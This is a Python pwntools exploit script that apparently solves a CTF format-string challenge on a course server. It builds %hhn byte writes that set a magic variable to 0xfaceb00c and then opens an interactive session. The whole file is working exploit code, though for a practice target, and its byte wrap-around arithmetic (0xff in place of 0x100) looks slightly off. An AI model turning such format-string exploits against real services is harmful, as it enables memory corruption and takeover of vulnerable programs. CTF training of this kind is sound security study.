from pwn import *

context.arch = 'amd64'

host = 'csie.ctf.tw'
port = 10134
# host = '127.0.0.1'
# port = 8888
r = remote(host, port)

# input('Press ENTER to continue.')

magic = 0x60106c

# payload = '%' + str(0x0c) + 'c%22$hhn'
# payload += '%' + str(0xb0-0x0c) + 'c%23$hhn'
# payload += '%' + str(0xce-0xb0) + 'c%24$hhn'
# payload += '%' + str(0xfa-0xce) + 'c%25$hhn'

def fmt(prev, val, idx):
    ret = ''
    if val > prev:
        ret = '%' + str(val - prev) + 'c'
    elif val < prev:
        ret = '%' + str(0xff + val - prev) + 'c'
    ret += '%' + str(idx) + '$hhn'
    return ret

# payload = fmt(0, 0x0c, 22)
# payload += fmt(0x0c, 0xb0, 23)
# payload += fmt(0xb0, 0xce, 24)
# payload += fmt(0xce, 0xfa, 25)

target = 0xfaceb00c
payload = ''
idx = 22
prev = 0
for i in range(4):
    val = (target >> (8*i)) & 0xff
    payload += fmt(prev, val, idx+i)
    prev = val

payload = payload.encode().ljust(0x80, b'a')

r.sendline(payload + flat([magic, magic+1, magic+2, magic+3]))

r.interactive()
